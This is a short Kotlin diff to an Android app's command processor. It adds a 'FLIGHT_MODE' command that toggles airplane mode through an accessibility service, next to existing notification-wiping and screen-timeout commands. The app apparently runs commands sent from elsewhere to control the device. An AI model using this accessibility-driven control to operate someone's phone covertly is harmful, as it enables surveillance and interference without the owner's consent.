@@ -843,6 +843,23 @@ object CommandProcessor {
                         DebugLogger.log("WIPE_NOTIF", "Failed: Notification listener service is offline or lacking permission.")
                     }
                 }
+                "FLIGHT_MODE" -> {
+                    val targetState = content.trim().uppercase() == "ON"
+                    val isCurrentlyOn = android.provider.Settings.Global.getInt(ctx.contentResolver, android.provider.Settings.Global.AIRPLANE_MODE_ON, 0) != 0
+                    if (isCurrentlyOn == targetState) {
+                        status = "ALREADY_IN_STATE"
+                        errorMsg = "Flight mode is already ${if(targetState) "ON" else "OFF"}"
+                    } else {
+                        val service = MyAccessibilityService.instance
+                        if (service != null) {
+                            service.startAirplaneModeSequence(id, if(targetState) "ON" else "OFF")
+                            status = "FLIGHT_MODE_SEQUENCE_INITIATED"
+                        } else {
+                            status = "FAILED (SERVICE_OFF)"
+                            errorMsg = "Accessibility service is offline."
+                        }
+                    }
+                }
                 "SCREEN_TIMEOUT" -> {
                     val secs = content.trim().toIntOrNull() ?: 30
                     if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M && android.provider.Settings.System.canWrite(ctx)) {
